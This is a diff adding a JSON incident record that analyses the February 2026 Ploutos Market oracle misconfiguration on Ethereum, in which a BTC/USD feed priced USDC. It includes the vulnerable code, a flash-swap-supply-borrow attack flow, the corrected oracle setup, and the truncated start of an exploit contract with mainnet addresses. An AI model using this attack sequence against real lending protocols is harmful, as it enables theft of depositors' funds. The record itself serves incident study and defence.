@@ -1,0 +1,43 @@
+{
+ "id": "2026__2026-02-26_PloutosMarket_WrongOracle_ETH",
+ "source_file": "2026/2026-02-26_PloutosMarket_WrongOracle_ETH.md",
+ "title": "Ploutos Market — Misconfigured Oracle Analysis (BTC/USD → USDC)",
+ "date": "2026-02-26",
+ "protocol": "Ploutos Market",
+ "chain": "Ethereum Mainnet",
+ "loss_raw": "~187.36 WETH (≈ $389,802 / attacker net profit)",
+ "loss_usd": 389802.0,
+ "root_cause": "Chainlink BTC/USD feed misconfigured as USDC price source — 1 USDC valued at $68,554",
+ "attack_tx": "0xa17d...8474",
+ "vulnerable_contract": "0x9DCE...D30 (AaveOracle)",
+ "classes": [
+  "oracle-price-manipulation"
+ ],
+ "code_before": [
+  "// AaveOracle.sol — getAssetPrice()\nfunction getAssetPrice(address asset) public view override returns (uint256) {\n    AggregatorInterface source = assetsSources[asset];  // ❌ USDC → BTC/USD feed registered\n\n    if (asset == BASE_CURRENCY) {\n        return BASE_CURRENCY_UNIT;\n    } else if (address(source) == address(0)) {\n        return _fallbackOracle.getAssetPrice(asset);\n    } else {\n        int256 price = source.latestAnswer();  // ❌ Calls latestAnswer() on BTC/USD feed\n        if (price > 0) {\n            return uint256(price);             // ❌ Returns $68,554 → used as USDC price\n        } else {\n            return _fallbackOracle.getAssetPrice(asset);\n        }\n    }\n}",
+  "// ValidationLogic.sol (Aave v3 internal) — collateral value calculation\nfunction calculateUserAccountData(...) {\n    // USDC collateral value calculation:\n    // userCollateralInBaseCurrency += assetPrice * userBalance / 10^decimals\n    // = 6,855,405,329,514 * 8,879,192 / 10^6    ← ❌ BTC price × USDC balance\n    // = 6,085,305,540,774,888 / 1e8\n    // = $60,853,055                              ← ❌ Actual $8.88 → 6.8M× error\n\n    // Borrowable amount (LTV 65%):\n    // maxBorrow = $60,853,055 * 65% = $39,554,485 (theoretical maximum)\n    // → Attacker actually borrowed only $389,802 (a small fraction)\n}",
+  "1. UniV2 Flash Swap initiated\n   ┌─────────────────────────────────────────────────┐\n   │ UniV2 USDC/WETH LP (0xb4e16d01...)              │\n   │ → Sends 8.879 USDC to attack contract           │\n   │   (to be repaid with 0.004289 WETH in callback) │\n   └────────────────────┬────────────────────────────┘\n                        │ 8.879 USDC received\n                        ▼\n2. Supply USDC collateral to Ploutos\n   ┌─────────────────────────────────────────────────┐\n   │ Ploutos Pool (0x7398e7e3...)                     │\n   │ supply(USDC, 8,879,192, exploitContract, 0)     │\n   │                                                 │\n   │ Oracle evaluation:                              │\n   │   8.879 USDC × $68,554/USDC = $608,705          │ ← ❌ BTC price applied\n   │   LTV 65% → borrow limit $395,658               │\n   └────────────────────┬────────────────────────────┘\n                        │ LEthereumUSDC (aToken) received\n                        ▼\n3. Borrow WETH\n   ┌─────────────────────────────────────────────────┐\n   │ Ploutos Pool                                    │\n   │ borrow(WETH, 187,366,746,326,704,993,556,       │\n   │        2, 0, exploitContract)                  │\n   │                                                 │\n   │ Actual borrow value: 187.37 WETH × $2,080 = $389,802 │\n   │ Protocol-recognized LTV: 64.1% → allowed ✓     │\n   └────────────────────┬────────────────────────────┘\n                        │ 187.37 WETH received\n                        ▼\n4. Repay UniV2 Flash Swap\n   ┌─────────────────────────────────────────────────┐\n   │ UniV2 callback completed                        │\n   │ → Transfer 0.004289 WETH (cost to swap 8.879 USDC) │\n   └─────────────────────────────────────────────────┘\n                        │\n                        ▼\n5. Profit realized\n   Attacker profit: 187.37 - 0.004289 = 187.362 WETH ≈ $389,802"
+ ],
+ "code_after": [
+  "// ✅ USDC should be configured with the Chainlink USDC/USD feed\n// Ethereum Mainnet USDC/USD: 0x8fFfFfd4AfB6115b954Bd326cbe7B4BA576818f6\n\n// At deployment or when calling setAssetSources():\naddress[] memory assets = new address[](1);\naddress[] memory sources = new address[](1);\nassets[0] = USDC_ADDRESS;\nsources[0] = 0x8fFfFfd4AfB6115b954Bd326cbe7B4BA576818f6;  // ✅ Chainlink USDC/USD\naaveOracle.setAssetSources(assets, sources);",
+  "// ✅ Set correct oracle source — Chainlink USDC/USD\n// Ethereum Mainnet Chainlink USDC/USD: 0x8fFfFfd4AfB6115b954Bd326cbe7B4BA576818f6\n\naddress[] memory assets = new address[](1);\naddress[] memory sources = new address[](1);\nassets[0]  = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;  // USDC\nsources[0] = 0x8fFfFfd4AfB6115b954Bd326cbe7B4BA576818f6;  // ✅ USDC/USD feed\n\n// Update immediately with admin privileges\naaveOracle.setAssetSources(assets, sources);"
+ ],
+ "steps": [
+  "1. UniV2 Flash Swap initiated",
+  "→ Sends 8.879 USDC to attack contract",
+  "8.879 USDC received",
+  "2. Supply USDC collateral to Ploutos",
+  "8.879 USDC × $68,554/USDC = $608,705 ← ❌ BTC price applied",
+  "LTV 65% → borrow limit $395,658",
+  "3. Borrow WETH",
+  "Protocol-recognized LTV: 64.1% → allowed ✓",
+  "187.37 WETH received",
+  "4. Repay UniV2 Flash Swap",
+  "→ Transfer 0.004289 WETH (cost to swap 8.879 USDC)",
+  "5. Profit realized"
+ ],
+ "other_code": [
+  "assetsSources[USDC] = 0xF4030086522a5bEEa4988F8cA5B36dbC97BeE88c\n0xF4030086.description() = \"BTC / USD\"          ← should be a USDC oracle\n0xF4030086.latestAnswer() = 6,855,405,329,514   ← $68,554.05 (8 decimals)",
+  "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface IUniswapV2Pair {\n    // Flash swap: borrow amount0 or amount1, repay in callback\n    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;\n}\n\ninterface IPloutosPool {\n    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;\n    function borrow(address asset, uint256 amount, uint256 interestRateMode,\n                    uint16 referralCode, address onBehalfOf) external;\n}\n\ncontract PloutosExploit {\n    address constant USDC     = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;\n    address constant WETH     = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n    // Uniswap V2 USDC/WETH LP pool\n    address constant UNIV2_LP = 0xb4e16d0168e52d35cacd2c6185b4"
+ ]
+}
